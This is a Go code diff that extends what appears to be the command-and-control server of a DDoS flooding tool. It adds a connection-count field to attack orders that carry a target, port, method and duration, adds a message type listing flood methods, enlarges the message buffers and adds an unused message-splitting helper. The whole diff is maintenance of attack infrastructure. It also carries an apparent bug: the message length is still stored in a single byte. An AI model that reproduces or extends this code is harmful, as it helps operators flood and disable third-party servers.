@@ -23,6 +23,7 @@ type AttackMessage struct {
 		Target   string `json:"target"`
 		Port     string `json:"port"`
 		Method   string `json:"method"`
+		Conns	 string `json:"conns"`
 		Duration string `json:"duration"`
 	} `json:"data"`
 	Options struct {
@@ -32,6 +33,12 @@ type AttackMessage struct {
 	} `json:"options"`
 }
 
+type MethodsMessage struct {
+    ID        int      `json:"mmid"`
+    MessageID int      `json:"messageid"`
+    Methods   []string `json:"methods"` // List of methods
+}
+
 const (
 	MessageAuthenticate = iota
 	MessageSuccess      = iota
@@ -39,6 +46,7 @@ const (
 	MessageAttack       = iota
 	MessagePing         = iota
 	MessageStop         = iota
+	MessageMethods 		= 105
 )
 
 var (
@@ -47,7 +55,7 @@ var (
 )
 
 func (s *Server) ReadMessage() (*Message, error) {
-	buf := make([]byte, 256)
+	buf := make([]byte, 1024)
 	n, err := s.Read(buf)
 	if err != nil || n < 0 {
 		delete(Servers, s.Name)
@@ -55,7 +63,7 @@ func (s *Server) ReadMessage() (*Message, error) {
 		return nil, err
 	}
 	m := new(Message)
-	decoded := make([]byte, 256)
+	decoded := make([]byte, 1024)
 	len, err := base64.RawStdEncoding.Decode(decoded, buf[:n])
 	if err != nil {
 		logger.Println("failed to read message \"" + err.Error() + "\"")
@@ -74,6 +82,19 @@ func (s *Server) ReadMessage() (*Message, error) {
 	return m, nil
 }
 
+func splitMessages(data []byte) [][]byte {
+    // This is just an example, you might need a more sophisticated method of splitting
+    // if messages are larger, or a different delimiter is used
+    var messages [][]byte
+    start := 0
+    for i := 0; i < len(data); i++ {
+        if data[i] == '}' {  // Assuming that '}' ends a message
+            messages = append(messages, data[start:i+1])
+            start = i + 1
+        }
+    }
+    return messages
+}
 func (s *Server) NewMessage(ID int, Content string) (*Message, []byte) {
 	s.CurrentID++
 	m := &Message{
@@ -107,12 +128,14 @@ func (s *Server) NewAttack(atk *floods.Attack) {
 			Target   string "json:\"target\""
 			Port     string "json:\"port\""
 			Method   string "json:\"method\""
+			Conns    string "json:\"conns\""
 			Duration string "json:\"duration\""
 		}{
 			User:     atk.Parent,
 			Target:   atk.Target,
 			Port:     fmt.Sprint(atk.Port),
 			Method:   atk.Sname,
+			Conns:	  fmt.Sprint(atk.Conns),
 			Duration: fmt.Sprint(atk.Duration),
 		},
 		Options: struct {
@@ -130,7 +153,6 @@ func (s *Server) NewAttack(atk *floods.Attack) {
 		logger.Println("error while encoding message!")
 	}
 	msg := base64.RawStdEncoding.EncodeToString(bytes)
-	fmt.Println(msg)
 	buffer := make([]byte, 0)
 	buffer = append(buffer, byte(len(msg)))
 	for _, char := range msg {
